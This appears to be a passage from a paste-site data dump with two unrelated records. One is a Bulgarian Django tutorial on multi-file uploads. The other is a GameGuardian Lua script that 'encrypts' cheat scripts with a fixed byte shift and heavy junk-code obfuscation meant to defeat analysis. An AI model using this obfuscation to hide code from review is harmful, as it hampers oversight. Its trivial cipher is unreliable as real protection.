FROM main_table"
JETBJ9aA,Uploading of many file in Django App,horozov86,Python,Tuesday 17th of June 2025 08:36:41 AM CDT,"Качване на множество файлове във формата независимо дали са снимки или видео?
Чрез единични полета във вече съществуващия модел не работи, понеже по този начин се качват по една снимка и по едно видео.
Решението е да се направи допълнителен модел .....Media, който се свързва с първия модел. В него се добавя поле file = models.FileField и се оказва, къде ще се качват файловете.

Пример:
Първи модел

django.contrib.auth import get_user_model
from django.db import models
from django.utils import timezone

UserModel = get_user_model()


class Publication(models.Model):
    location = models.CharField(
        max_length=200,
        null=True,
        blank=True,
    )

    description = models.TextField(
        null=False,
        blank=False,
    )


    weight_kg = models.FloatField(
        null=True,
        blank=True,
    )

    created_at = models.DateTimeField(
        default=timezone.now,
    )

    user = models.ForeignKey(UserModel, on_delete=models.CASCADE)


Втори модел

class PublicationMedia(models.Model):
    MEDIA_TYPE_CHOICES = (
        ('image', 'Image'),
        ('video', 'Video'),
    )
    publication = models.ForeignKey(Publication, on_delete=models.CASCADE)
    file = models.FileField(upload_to='files/')
    media_type = models.CharField(max_length=5, choices=MEDIA_TYPE_CHOICES)


Формата не се променя и не й се добавя допълнителни полета. С добавено допълнително поле не работи, понеже това поле идва от другия модел. Остава си така:

class PublicationBaseForm(forms.ModelForm):
    class Meta:
        model = Publication
        fields = [""location"", ""description"", ""weight_kg""]
        widgets = {
            'location': forms.TextInput(attrs={'placeholder': 'Enter your fishing location'}),
            'description': forms.Textarea(attrs={'placeholder': 'Enter a description of your fishing experience'}),
            'weight_kg': forms.NumberInput(attrs={'placeholder': 'Enter weight of the fish'}),
        }


След което ръчно се добавя полето за качване на файловете в html-a по този начин:

<input type=""file"" name=""media_files"" multiple>

<input class=""publication-create-btn"" type=""submit"" value=""Add Publication"" />

Във view-то в променливата media_files става списък с качените файлове обекти.
Итерира се през всички файлове с for цикъл и се записва всеки един файл в базата свързан с публикацията.

@method_decorator(login_required, name='dispatch')
class PublicationCreateView(views.CreateView):
    form_class = PublicationCreateForm
    model = Publication
    template_name = ""publications/publication_create.html""
    success_url = reverse_lazy(""feed"")

    def form_valid(self, form):
        self.object = form.save(commit=False)
        self.object.user = self.request.user
        self.object.save()

        media_files = self.request.FILES.getlist('media_files') --> списък от фаловете
        for file in media_files: --> итерира се
            content_type = file.content_type
            media_type = 'video' if content_type.startswith('video') else 'image' --> взима се типа на файла
            PublicationMedia.objects.create(
                publication=self.object,
                file=file,
                media_type=media_type
            ) --> създава се обект

        return super().form_valid(form)"
a064Zzna,Tools,cnsnipermike,Lua,Tuesday 17th of June 2025 07:55:38 AM CDT,"function Main()
MAIN = gg.choice({
""联系方式"",
""加密工具"",
""退出"",
})
if MAIN == nil then
else
if MAIN == 1 then A1() end
if MAIN == 2 then A2() end
if MAIN == 3 then End() end
end
FMXR=-1
end
function A1()
gg.alert('Telegram@sijimuge\n微信：feimengxinren044\nLine：pubglegends205\n\n加了联系方式请明确表明来意，感謝配合')
Main()
end
function END()
gg.setVisible(true)
os.exit()
end
function A2()
gg.alert(""2020年开发的加密工具1.0\n可能会被破解，但也能做到最基础的保护"")
;(function()
if gg.VERSION < ""101.1"" then return gg.alert(""Use minimal GG Version 90.0"") else
local g = {}
g.last = gg.getFile()
g.info = nil
g.config = gg.EXT_CACHE_DIR .. ""/"" .. gg.getFile():match(""[^/]+$"") .. "".cfg""
g.data = loadfile(g.config)
if g.data ~= nil then
g.info = g.data()
g.data = nil
end
if g.info == nil then
g.info = {g.last, g.last:gsub(""/[^/]+$"", """")}
end
local mode_read_only = 'r'
local mode_read_all = '*a'
local mode_write_only = 'w'
local data_read = function(read_path, open_mode, read_mode)
local read_file = io.open(read_path, open_mode)
local content = read_file:read(read_mode)
read_file:close()
return content
end
local data_write = function(write_path, write_mode, data_to_write)
local write_file = io.open(write_path, write_mode)
write_file:write(data_to_write)
write_file:write("""")
write_file:close()
end
while true do
g.info = gg.prompt({
""📎 选择脚本: "", --1
""📂 选择加密后保存路径: "", --2
""⏳ 设置过期日"", --3
""🔐 添加密码"", --4
}, g.info, {
""file"", --1
""path"", --2
""checkbox"", --3
""checkbox"", --4
})
if g.info == nil then Main() end
if g.info[1] == '' then 
local LUA_File_nil = ""⚠️️ 错误 ⚠️️\n\n文件不存在！""
return gg.alert(LUA_File_nil)
end
if g.info[2] == '' then 
local LUA_File_nil = ""⚠️️ 错误 ⚠️️\n\n路径不存在！""
return gg.alert(LUA_File_nil)
end
gg.saveVariable(g.info, g.config)
if g.info[1]:match(""%.lua$"") ~= nil then
LUA_Script_filter = g.info[1]:match(""[^/]+$""):gsub(""%.lua$"", function(c)
c = "".enc.lua""
return c 
end)
else
local File_not_lua = ""⚠️️ 错误 ⚠️️\n\n检测到非 lua 脚本！""
return gg.alert(File_not_lua)
end
Test = data_read(g.info[1], mode_read_only, mode_read_all)
if (5 * string.len(Test) >= 10000000) then
Big_file = ""⚠️️ 错误 ⚠️️\n\n源文件过大！""
print(Big_file)
return gg.alert(Big_file)
else
if load(Test) == nil then
return gg.alert(""⚠️️ 无法加密！ ⚠️️"")
end
end
LUA_Script_out = g.info[2] .. ""/"" .. LUA_Script_filter
function KeyToInt()
key1 = 11
key2 = 12
return_key = key1 + key2
return return_key
end
local Encrypt = function(str, textKey)
local text = ''
for i = 1, #str do
text = text .. '#' .. string.byte(str:sub(i, i)) + KeyToInt(textKey) %256
end
return text
end
local Decrypt = [============================================[
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
key1 = 11 
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
key2 = 12 
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
function KeyToInt()
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
return_key = key1 + key2 
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
return return_key
end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
